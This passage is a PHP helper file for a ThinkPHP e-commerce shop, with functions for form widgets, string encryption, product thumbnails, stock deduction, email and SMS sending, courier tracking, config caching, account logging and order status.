<?php
use think\Db;
define('EXTEND_MODULE', 1);
define('EXTEND_ANDROID', 2);
define('EXTEND_IOS', 3);
define('EXTEND_ENTRUST', 4); //委托服务
define('EXTEND_MINIAPP', 5);
define("EXTEND_H5",6);//添加终端h5
define('TIME_MOUTH', 4);


// 应用公共文件
function p($str) {
    echo '<pre>';
    print_r($str);
}

function nodeTree($arr, $id = 0, $level = 0) {
    static $array = array();
    foreach ($arr as $v) {
        if ($v['parentid'] == $id) {
            $v['level'] = $level;
            $array[] = $v;
            nodeTree($arr, $v['id'], $level + 1);
        }
    }
    return $array;
}

/**
 * 数组转树
 * @param type $list
 * @param type $root
 * @param type $pk
 * @param type $pid
 * @param type $child
 * @return type
 */
function list_to_tree($list, $root = 0, $pk = 'id', $pid = 'parentid', $child = '_child') {
    // 创建Tree
    $tree = array();
    if (is_array($list)) {
        // 创建基于主键的数组引用
        $refer = array();
        foreach ($list as $key => $data) {
            $refer[$data[$pk]] = &$list[$key];
        }
        foreach ($list as $key => $data) {
            // 判断是否存在parent
            $parentId = 0;
            if (isset($data[$pid])) {
                $parentId = $data[$pid];
            }
            if ((string) $root == $parentId) {
                $tree[] = &$list[$key];
            } else {
                if (isset($refer[$parentId])) {
                    $parent = &$refer[$parentId];
                    $parent[$child][] = &$list[$key];
                }
            }
        }
    }
    return $tree;
}

/**
 * 下拉选择框
 */
function select($array = array(), $id = 0, $str = '', $default_option = '') {
    $string = '<select ' . $str . '>';
    $default_selected = (empty($id) && $default_option) ? 'selected' : '';
    if ($default_option)
        $string .= "<option value='' $default_selected>$default_option</option>";
    if (!is_array($array) || count($array) == 0)
        return false;
    $ids = array();
    if (isset($id))
        $ids = explode(',', $id);
    foreach ($array as $key => $value) {
        $selected = in_array($key, $ids) ? 'selected' : '';
        $string .= '<option value="' . $key . '" ' . $selected . '>' . $value . '</option>';
    }
    $string .= '</select>';
    return $string;
}

/**
 * 复选框
 *
 * @param $array 选项 二维数组
 * @param $id 默认选中值，多个用 '逗号'分割
 * @param $str 属性
 * @param $defaultvalue 是否增加默认值 默认值为 -99
 * @param $width 宽度
 */
function checkbox($array = array(), $id = '', $str = '', $defaultvalue = '', $width = 0, $field = '') {
    $string = '';
    $id = trim($id);
    if ($id != '')
        $id = strpos($id, ',') ? explode(',', $id) : array($id);
    if ($defaultvalue)
        $string .= '<input type="hidden" ' . $str . ' value="-99">';
    $i = 1;
    foreach ($array as $key => $value) {
        $key = trim($key);
        $checked = ($id && in_array($key, $id)) ? 'checked' : '';
        if ($width)
            $string .= '<label class="ib" style="width:' . $width . 'px">';
        $string .= '<input type="checkbox" ' . $str . ' id="' . $field . '_' . $i . '" ' . $checked . ' value="' . $key . '"> ' . $value;
        if ($width)
            $string .= '</label>';
        $i++;
    }
    return $string;
}

/**
 * 单选框
 *
 * @param $array 选项 二维数组
 * @param $id 默认选中值
 * @param $str 属性
 */
function radio($array = array(), $id = 0, $str = '', $width = 0, $field = '') {
    $string = '';
    foreach ($array as $key => $value) {
        $checked = trim($id) == trim($key) ? 'checked' : '';
        if ($width)
            $string .= '<label class="ib" style="width:' . $width . 'px">';
        $string .= '<input type="radio" ' . $str . ' id="' . $field . '_' . $key . '" ' . $checked . ' value="' . $key . '"> ' . $value;
        if ($width)
            $string .= '</label>';
    }
    return $string;
}

/**
 * 字符串加密、解密函数
 *
 *
 * @param	string	$txt		字符串
 * @param	string	$operation	ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
 * @param	string	$key		密钥：数字、字母、下划线
 * @param	string	$expiry		过期时间
 * @return	string
 */
function encry_code($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $key = md5($key != '' ? $key : config('encry_key'));
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    }
}

/**
 * tpshop检验登陆
 * @param
 * @return bool
 */
function is_login(){
    if(isset($_SESSION['admin_id']) && $_SESSION['admin_id'] > 0){
        return $_SESSION['admin_id'];
    }else{
        return false;
    }
}
/**
 * 获取用户信息
 * @param $user_value  用户id 邮箱 手机 第三方id
 * @param int $type  类型 0 user_id查找 1 邮箱查找 2 手机查找 3 第三方唯一标识查找
 * @param string $oauth  第三方来源
 * @return mixed
 */
function get_user_info($user_value, $type = 0, $oauth = '')
{
    $map = [];
    if ($type == 0) {
        $map['user_id'] = $user_value;
    } elseif ($type == 1) {
        $map['email'] = $user_value;
    } elseif ($type == 2) {
        $map['mobile'] = $user_value;
    } elseif ($type == 3) {
        $thirdUser = Db::name('oauth_users')->where(['openid' => $user_value, 'oauth' => $oauth])->find();
        $map['user_id'] = $thirdUser['user_id'];
    } elseif ($type == 4) {
        $thirdUser = Db::name('oauth_users')->where(['unionid' => $user_value])->find();
        $map['user_id'] = $thirdUser['user_id'];
    }

    return Db::name('users')->where($map)->find();
}

/**
 *  获取规格图片
 * @param type $goods_id  商品id
 * @param type $item_id   规格id
 * @return
 */
function getGoodsSpecImg($goods_id,$item_id){
    $specImg = Db::name('spec_goods_price')->where(["goods_id"=>$goods_id,"item_id"=>$item_id])->cache(true)->value('spec_img');
    if (empty($specImg)) {
        return '';
    }

    return $specImg;
}

/**
 *  商品缩略图 给于标签调用 拿出商品表的 original_img 原始图来裁切出来的
 * @param type $goods_id  商品id
 * @param type $width     生成缩略图的宽度
 * @param type $height    生成缩略图的高度
 * @param type $item_id   规格id
 */
function goods_thum_images($goods_id, $width, $height,$item_id=0)
{

    if (empty($goods_id)) return '';
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_thumb_{$goods_id}_{$item_id}_{$width}_{$height}";

    // 这个商品 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';
    $original_img = '';//先定义空字符变量
    if($item_id){
        $original_img = Db::name('spec_goods_price')->where(["goods_id"=>$goods_id,'item_id'=>$item_id])->cache(true, 30, 'original_img_cache')->value('spec_img');

    }
    if(empty($original_img)){
        $original_img = Db::name('goods')->where("goods_id", $goods_id)->cache(true, 30, 'original_img_cache')->value('original_img');
    }


    if (empty($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }
    
    if(tpCache('oss.oss_switch')){
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
            return $ossUrl;
        }    
    } 

    $original_img = '.' . $original_img; // 相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if(strstr(strtolower($original_img),'.gif'))
        {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 商品相册缩略图
 */
function get_sub_images($sub_img, $goods_id, $width, $height)
{
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_sub_thumb_{$sub_img['img_id']}_{$width}_{$height}";
    
    //这个缩略图 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';

    if(tpCache('oss.oss_switch')){
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsAlbumThumbUrl($sub_img['image_url'], $width, $height))) {
            return $ossUrl;
        }
    }
    
    $original_img = '.' . $sub_img['image_url']; //相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if(strstr(strtolower($original_img),'.gif'))
        {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 刷新商品库存, 如果商品有设置规格库存, 则商品总库存 等于 所有规格库存相加
 * @param type $goods_id  商品id
 */
function refresh_stock($goods_id){
    $count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->count();
    if($count == 0) return false; // 没有使用规格方式 没必要更改总库存

    $store_count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->sum('store_count');
    M("Goods")->where("goods_id", $goods_id)->save(array('store_count'=>$store_count)); // 更新商品的总库存
}

/**
 * 根据 order_goods 表扣除商品库存
 * @param $order|订单对象或者数组
 * @throws \think\Exception
 */
function minus_stock($order){
    $orderGoodsArr = M('OrderGoods')->master()->where("order_id", $order['order_id'])->select();
    foreach($orderGoodsArr as $key => $val)
    {
        // 有选择规格的商品
        if(!empty($val['spec_key']))
        {   // 先到规格表里面扣除数量 再重新刷新一个 这件商品的总数量
            $SpecGoodsPrice = new \app\common\model\SpecGoodsPrice();
            $specGoodsPrice = $SpecGoodsPrice::get(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']]);
            $specGoodsPrice->where(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']])->setDec('store_count', $val['goods_num']);
            refresh_stock($val['goods_id']);
            if($val['prom_type'] == 6){
                db('team_goods_item')->where(['item_id' => $specGoodsPrice['item_id'], 'deleted' => 0])->setInc('sales_sum', $val['goods_num']);
            }
        }else{
            $specGoodsPrice = null;
            M('Goods')->where("goods_id", $val['goods_id'])->setDec('store_count',$val['goods_num']); // 直接扣除商品总数量
        }
        M('Goods')->where("goods_id", $val['goods_id'])->setInc('sales_sum',$val['goods_num']); // 增加商品销售量
        //更新活动商品购买量
        if ($val['prom_type'] == 1 || $val['prom_type'] == 2) {
            $GoodsPromFactory = new \app\common\logic\GoodsPromFactory();
            $goodsPromLogic = $GoodsPromFactory->makeModule($val, $specGoodsPrice);
            $prom = $goodsPromLogic->getPromModel();
            if ($prom['is_end'] == 0) {
                $tb = $val['prom_type'] == 1 ? 'flash_sale' : 'group_buy';
                M($tb)->where("id", $val['prom_id'])->setInc('buy_num', $val['goods_num']);
                M($tb)->where("id", $val['prom_id'])->setInc('order_num');
            }
        }
        //更新拼团商品购买量
        if($val['prom_type'] == 6){
            Db::name('team_activity')->where('team_id',  $val['prom_id'])->setInc('sales_sum', $val['goods_num']);
        }elseif($val['prom_type'] == 8){
            // 增加砍价购买量
            Db::name('promotion_bargain_goods_item')->where('bargain_id',  $val['prom_id'])->setInc('buy_num', $val['goods_num']);
        }
        update_stock_log($order['user_id'], -$val['goods_num'], $val, $order['order_sn'], 2);//库存日志
    }
}

/**
 * 邮件发送
 * @param $to    接收人
 * @param string $subject   邮件标题
 * @param string $content   邮件内容(html模板渲染后的内容)
 * @param array $attachments 附件(二维数组-[[附件地址,名称],[附件地址,名称]])
 * @throws Exception
 * @throws phpmailerException
 */
function send_email($to,$subject='',$content='',$attachments=[]){
    vendor('phpmailer.PHPMailerAutoload'); ////require_once vendor/phpmailer/PHPMailerAutoload.php';
    //判断openssl是否开启
    $openssl_funcs = get_extension_funcs('openssl');
    if(!$openssl_funcs){
        return array('status'=>-1 , 'msg'=>'请先开启openssl扩展');
    }
    $mail = new PHPMailer;
    $config = tpCache('smtp');
    $mail->CharSet  = 'UTF-8'; //设定邮件编码，默认ISO-8859-1，如果发中文此项必须设置，否则乱码
    $mail->isSMTP();
    //Enable SMTP debugging
    // 0 = off (for production use)
    // 1 = client messages
    // 2 = client and server messages
    $mail->SMTPDebug = 0;
    //调试输出格式
    //$mail->Debugoutput = 'html';
    //smtp服务器
    $mail->Host = $config['smtp_server'];
    //端口 - likely to be 25, 465 or 587
    $mail->Port = $config['smtp_port'];

    if($mail->Port == 465) $mail->SMTPSecure = 'ssl';// 使用安全协议
    //Whether to use SMTP authentication
    $mail->SMTPAuth = true;
    //用户名
    $mail->Username = $config['smtp_user'];
    //密码
    $mail->Password = $config['smtp_pwd'];
    //Set who the message is to be sent from
    $mail->setFrom($config['smtp_user']);
    //回复地址
    //$mail->addReplyTo('replyto@example.com', 'First Last');
    //接收邮件方
    if(is_array($to)){
        foreach ($to as $v){
            $mail->addAddress($v);
        }
    }else{
        $mail->addAddress($to);
    }

    $mail->isHTML(true);// send as HTML
    //标题
    $mail->Subject = $subject;
    //HTML内容转换
    $mail->msgHTML($content);
    //Replace the plain text body with one created manually
    //$mail->AltBody = 'This is a plain-text message body';
    //添加附件
    if (!empty($attachments)) {
        foreach ($attachments as $attachment) {
            $mail->addAttachment($attachment['path'], $attachment['name']);
        }
    }
    //$mail->addAttachment('images/phpmailer_mini.png');
    //send the message, check for errors
    if (!$mail->send()) {
        return array('status'=>-1 , 'msg'=>'发送失败: '.$mail->ErrorInfo);
    } else {
        return array('status'=>1 , 'msg'=>'发送成功');
    }
}

/**
 * 检测是否能够发送短信
 * @param unknown $scene
 * @return multitype:number string
 */
function checkEnableSendSms($scene)
{
    $scenes = C('SEND_SCENE');
    $sceneItem = $scenes[$scene];
    if (!$sceneItem) {
        return array("status" => -1, "msg" => "场景参数'scene'错误!");
    }
    $key = $sceneItem[2];
    $sceneName = $sceneItem[0];
    $config = tpCache('sms');
    $smsEnable = $config[$key];
    
    $isCheckRegCode = tpCache('sms.regis_sms_enable');
    if(!$isCheckRegCode || $isCheckRegCode===0){
        return array("status" => 0, "msg" => "短信验证码功能关闭, 无需校验验证码");
    }

    if (!$smsEnable) {
        return array("status" => -1, "msg" => "['$sceneName']发送短信被关闭'");
    }
    //判断是否添加"注册模板"
    $size = M('sms_template')->where("send_scene", $scene)->count('tpl_id');
    if (!$size) {
        return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
    }
    

    return array("status"=>1,"msg"=>"可以发送短信");
}

/**
 * 发送短信逻辑
 * @param unknown $scene
 */
function sendSms($scene, $sender, $params,$unique_id=0)
{
    $smsLogic = new \app\common\logic\SmsLogic;
    return $smsLogic->sendSms($scene, $sender, $params, $unique_id);
}

/**
 * 查询快递
 * @param $shipping_code  快递公司编码
 * @param $invoice_no  快递单号
 * @return array  物流跟踪信息数组
 */
function queryExpress($shipping_code , $invoice_no) {
    $express = tpCache('express');
    if(empty($express['kd100_key']) or empty($express['kd100_customer'])){
        // http://www.kuaidi100.com/query?type=zhongtong&postid=75140146720238&temp=0.2370451903168569&phone=  0.3141174374951695
        $url = "http://www.kuaidi100.com/query?type=" . $shipping_code . "&postid=" . $invoice_no . "&id=19&valicode=&temp=0.2370451903168569";
        $resp = httpRequest($url, "GET");
        return json_decode($resp, true);
    }
    $key = $express['kd100_key'];                       //客户授权key
    $customer = $express['kd100_customer'];                 //查询公司编号
    $param = array (
        'com' =>$shipping_code,         //快递公司编码yunda   zhongtong 75143331039625
        'num' =>$invoice_no,    //快递单号3950055201640
        'phone' => '',              //手机号
        'from' => '',               //出发地城市
        'to' => '',                 //目的地城市
        'resultv2' => '1'           //开启行政区域解析
    );

    //请求参数
    $post_data = array();
    $post_data["customer"] = $customer;
    $post_data["param"] = json_encode($param);
    $sign = md5($post_data["param"].$key.$post_data["customer"]);
    $post_data["sign"] = strtoupper($sign);

    $url = 'http://poll.kuaidi100.com/poll/query.do';   //实时查询请求地址

    $params = "";
    foreach ($post_data as $k=>$v) {
        $params .= "$k=".urlencode($v)."&";     //默认UTF-8编码格式
    }
    $post_data = substr($params, 0, -1);

    //发送post请求
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    $data = str_replace("\"", '"', $result );
    $data = json_decode($data,true);

    return $data;
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getCatGrandson ($cat_id)
{
    $GLOBALS['catGrandson'] = array();
    $GLOBALS['category_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['catGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['category_id_arr'] = M('GoodsCategory')->cache(true,TP_CACHE_TIME)->getField('id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('GoodsCategory')->where("parent_id", $cat_id)->cache(true,TP_CACHE_TIME)->getField('id',true);
    foreach($son_id_arr as $k => $v)
    {
        getCatGrandson2($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个文章分类的 儿子 孙子  重子重孙 的 id
 * @param $cat_id
 * @return array|mixed
 */
function getArticleCatGrandson ($cat_id)
{
    $GLOBALS['ArticleCatGrandson'] = array();
    $GLOBALS['cat_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['cat_id_arr'] = M('ArticleCat')->getField('cat_id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('ArticleCat')->where("parent_id", $cat_id)->getField('cat_id',true);
    foreach($son_id_arr as $k => $v)
    {
        getArticleCatGrandson2($v);
    }
    return $GLOBALS['ArticleCatGrandson'];
}

/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getCatGrandson2($cat_id)
{
    $GLOBALS['catGrandson'][] = $cat_id;
    foreach($GLOBALS['category_id_arr'] as $k => $v)
    {
        // 找到孙子
        if($v == $cat_id)
        {
            getCatGrandson2($k); // 继续找孙子
        }
    }
}


/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getArticleCatGrandson2($cat_id)
{
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    foreach($GLOBALS['cat_id_arr'] as $k => $v)
    {
        // 找到孙子
        if($v == $cat_id)
        {
            getArticleCatGrandson2($k); // 继续找孙子
        }
    }
}

/**
 * 查看某个用户购物车中商品的数量
 * @param type $user_id
 * @param type $session_id
 * @return type 购买数量
 */
function cart_goods_num($user_id = 0,$session_id = '')
{
//    $where = " session_id = '$session_id' ";
//    $user_id && $where .= " or user_id = $user_id ";
    // 查找购物车数量
//    $cart_count =  M('Cart')->where($where)->sum('goods_num');
    $cart_count = Db::name('cart')->where(function ($query) use ($user_id, $session_id) {
        $query->where('session_id', $session_id);
        if ($user_id) {
            $query->whereOr('user_id', $user_id);
        }
    })->sum('goods_num');
    $cart_count = $cart_count ? $cart_count : 0;
    return $cart_count;
}

/**
 * 获取商品库存
 * @param type $goods_id 商品id
 * @param type $key  库存 key
 */
function getGoodNum($goods_id,$key)
{
     if (!empty($key)){
        return M("SpecGoodsPrice")
                        ->alias("s")
                        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
                        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
    }else{ 
        return M("Goods")->where(array("goods_id"=>$goods_id , "is_on_sale"=>1))->getField('store_count');
    }
}

/**
 * 获取缓存或者更新缓存
 * @param string $config_key 缓存文件名称
 * @param array $data 缓存数据  array('k1'=>'v1','k2'=>'v3')
 * @return array or string or bool
 */
function tpCache($config_key,$data = array()){
    $param = explode('.', $config_key);
    if(empty($data)){
        //如$config_key=shop_info则获取网站信息数组
        //如$config_key=shop_info.logo则获取网站logo字符串
        $config = F($param[0],'',TEMP_PATH);//直接获取缓存文件
        if(empty($config)){
            //缓存文件不存在就读取数据库
            $res = D('config')->where("inc_type",$param[0])->select();
            if($res){
                foreach($res as $k=>$val){
                    $config[$val['name']] = $val['value'];
                }
                F($param[0],$config,TEMP_PATH);
            }
        }
        if(count($param)>1){
            return $config[$param[1]];
        }else{
            return $config;
        }
    }else{
        //更新缓存
        $result =  D('config')->where("inc_type", $param[0])->select();
        if($result){
            foreach($result as $val){
                $temp[$val['name']] = $val['value'];
            }
            foreach ($data as $k=>$v){
                $newArr = array('name'=>$k,'value'=>trim($v),'inc_type'=>$param[0]);
                if(!isset($temp[$k])){
                    M('config')->add($newArr);//新key数据插入数据库
                }else{
                    if($v!=$temp[$k])
                        M('config')->where("name", $k)->save($newArr);//缓存key存在且值有变更新此项
                }
            }
            //更新后的数据库记录
            $newRes = D('config')->where("inc_type", $param[0])->select();
            foreach ($newRes as $rs){
                $newData[$rs['name']] = $rs['value'];
            }
        }else{
            foreach($data as $k=>$v){
                $newArr[] = array('name'=>$k,'value'=>trim($v),'inc_type'=>$param[0]);
            }
            M('config')->insertAll($newArr);
            $newData = $data;
        }
        return F($param[0],$newData,TEMP_PATH);
    }
}

/**
 * 记录帐户变动
 * @param   int     $user_id        用户id
 * @param   int    $user_money     可用余额变动
 * @param   int     $pay_points     消费积分变动
 * @param   string  $desc    变动说明
 * @param   int    distribut_money 分佣金额
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @param bool $recharge false不操作$user_total_money ,true则$user_total_money记录充值累计金额
 * @param bool $withdrawn 0不操作$withdrawal_total_money ,大于0则$withdrawal_total_money记录提现累计金额
 * @return  bool
 */
function accountLog($user_id, $user_money = 0,$pay_points = 0, $desc = '',$distribut_money = 0,$order_id = 0 ,$order_sn = '',$recharge = false,$withdrawn = 0){
    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id'       => $user_id,
        'user_money'    => $user_money,
        'pay_points'    => $pay_points,
        'change_time'   => time(),
        'desc'   => $desc,
        'order_id' => $order_id,
        'order_sn' => $order_sn
    );

    /* 更新用户信息 */
    $update_data = array(
        'user_money'        => ['exp','user_money+'.$user_money],
        'pay_points'        => ['exp','pay_points+'.$pay_points],
        'distribut_money'   => ['exp','distribut_money+'.$distribut_money],
    );
    if($recharge) $update_data['user_total_money'] = ['exp','user_total_money+'.$user_money];  //用户充值累计金额
    if($withdrawn) $update_data['withdrawal_total_money'] = ['exp','withdrawal_total_money+'.$withdrawn];  //用户提现累计金额
    if(($user_money+$pay_points+$distribut_money) == 0)return false;
    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
    if($update){
        M('account_log')->add($account_log);
        return true;
    }else{
        return false;
    }
}



/**
 * 记录帐户合伙人佣金提现变动
 * @param   int     $user_id        用户id
 * @param   int    $pay_points 积分
 * @param   string    $desc 备注
 * @param   int    $distribut_money 分佣金额
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @return  bool
 */
function accountDistributLog($user_id,$pay_points = 0, $desc = '',$withdrawals_money = 0,$order_id = 0 ,$order_sn = '',$distribut_money = 0){
    /* 插入帐户变动记录 */
     $account_log = array(
         'user_id'       => $user_id,
         'distribut_money'    => $distribut_money,
         'change_time'   => time(),
         'desc'   => $desc,
         'order_id' => $order_id,
         'order_sn' => $order_sn
     );
 
    /* 更新用户信息 */
    $update_data = array(
        'distribut_withdrawals_money'   => ['exp','distribut_withdrawals_money+'.$withdrawals_money], //提现
        'distribut_money'   => ['exp','distribut_money+'.$distribut_money],     //获得佣金
    );

    if($distribut_money+$withdrawals_money == 0) return false;
    $update = Db::name('users')->where("user_id = $user_id")->save($update_data);
    if($update){
        M('account_distribut_log')->add($account_log);
        return true;
    }else{
        return false;
    }
}


/*
 * 获取地区列表
 */
function get_region_list(){
    return M('region')->cache(true)->getField('id,name');
}
/*
 * 获取用户地址列表
 */
function get_user_address_list($user_id){
    $lists = M('user_address')->where(array('user_id'=>$user_id))->select();
    return $lists;
}

/*
 * 获取指定地址信息
 */
function get_user_address_info($user_id,$address_id){
    $data = M('user_address')->where(array('user_id'=>$user_id,'address_id'=>$address_id))->find();
    return $data;
}
/*
 * 获取用户默认收货地址
 */
function get_user_default_address($user_id){
    $data = M('user_address')->where(array('user_id'=>$user_id,'is_default'=>1))->find();
    return $data;
}
/**
 * 获取订单状态的 中文描述名称
 * @param type $order_id  订单id
 * @param type $order     订单数组
 * @return string
 */
function orderStatusDesc($order_id = 0, $order = array())
{
    if(empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();

    // 货到付款
    if($order['pay_code'] == 'cod')
    {
        if(in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
    }
    else // 非货到付款
    {
        if($order['pay_status'] == 0 && $order['order_status'] == 0)
            return 'WAITPAY'; //'待支付',
        if($order['pay_status'] == 1 &&  in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
        if($order['pay_status'] == 1 &&  $order['shipping_status'] == 2 && $order['order_status'] == 1)
            return 'PORTIONSEND'; //'部分发货',
    }
    if(($order['shipping_status'] == 1) && ($order['order_status'] == 1))
        return 'WAITRECEIVE'; //'待收货',
    if($order['order_status'] == 2)
        return 'WAITCCOMMENT'; //'待评价',
    if($order['order_status'] == 3)
        return 'CANCEL'; //'已取消',
    if($order['order_status'] == 4)
        return 'FINISH'; //'已完成',
    if($order['order_status'] == 5)
        return 'CANCELLED'; //'已作废',
    return 'OTHER';
}

/**
 * 获取订单状态的 显示按钮
 * @param type $order_id  订单id
 * @param type $order     订单数组
 * @return array()
 */
function orderBtn($order_id = 0, $order = array())
{
    if(empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();
    /**
     *  订单用户端显示按钮
    去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
    取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
    确认收货  AND shipping_status=1 AND order_status=0
    评价      AND order_status=1
    查看物流  if(!empty(物流单号))
     */
    $btn_arr = array(
        'pay_btn' => 0, // 去支付按钮
        'cancel_btn' => 0, // 取消按钮
        'receive_btn' => 0, // 确认收货
        'comment_btn' => 0, // 评价按钮
        'shipping_btn' => 0, // 查看物流
        'return_btn' => 0, // 退货按钮 (联系客服)
        // 'contract_btn' => 0, // 下载采购合同
        // 'voucher_btn' => 0, // 上传付款凭证

    );


    // 货到付款
    if($order['pay_code'] == 'cod')
    {

        if(($order['order_status']==0 || $order['order_status']==1) && $order['shipping_status'] == 0) // 待发货
        {
            $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
        }
        if($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
        }
    } else{// 非货到付款
        if($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
        {
            $btn_arr['pay_btn'] = 1; // 去支付按钮
            $btn_arr['cancel_btn'] = 1; // 取消按钮
        }
        if($order['pay_status'] == 1 && in_array($order['order_status'],array(0,1)) && $order['shipping_status'] == 0) // 待发货
        {
//            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
            if ($order['prom_type'] == 6 || $order['prom_type'] == 4) {
                $btn_arr['cancel_btn'] = 0;
            } else {
